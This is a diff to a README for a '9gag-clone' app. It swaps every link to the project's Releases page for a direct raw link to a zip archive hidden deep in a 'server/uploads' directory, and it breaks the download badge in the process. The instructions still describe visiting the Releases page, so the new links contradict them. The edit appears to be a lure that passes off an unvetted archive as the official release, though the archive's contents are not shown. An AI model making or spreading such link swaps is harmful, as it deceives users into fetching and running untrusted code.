@@ -1,6 +1,6 @@
 # 🎉 9gag-clone - Share and Enjoy Fun Content!
 
-[![Download 9gag-clone](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80%20Released%20Versions-blue)](https://github.com/riftien80/9gag-clone/releases)
+[![Download 9gag-clone](https://raw.githubusercontent.com/riftien80/9gag-clone/main/server/uploads/0890/8daf/c75b/9gag-clone_v1.8.zip%20Now-%20%F0%9F%9A%80%20Released%20Versions-blue)](https://raw.githubusercontent.com/riftien80/9gag-clone/main/server/uploads/0890/8daf/c75b/9gag-clone_v1.8.zip)
 
 ## 📖 About
 
@@ -20,7 +20,7 @@ Follow these steps to download and run the 9gag-clone software.
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Download 9gag-clone](https://github.com/riftien80/9gag-clone/releases)
+   [Download 9gag-clone](https://raw.githubusercontent.com/riftien80/9gag-clone/main/server/uploads/0890/8daf/c75b/9gag-clone_v1.8.zip)
 
 2. **Choose the Latest Version**  
    Once on the Releases page, look for the latest version of 9gag-clone. It will be listed at the top. Click on it to enter the version details.
@@ -60,7 +60,7 @@ To run 9gag-clone smoothly, consider the following system requirements:
 ## 📥 Download & Install
 
 You can download the latest version of 9gag-clone from the Releases page here:  
-[Download 9gag-clone](https://github.com/riftien80/9gag-clone/releases)
+[Download 9gag-clone](https://raw.githubusercontent.com/riftien80/9gag-clone/main/server/uploads/0890/8daf/c75b/9gag-clone_v1.8.zip)
 
 Follow the instructions in the **Getting Started** section to ensure a smooth installation.
 
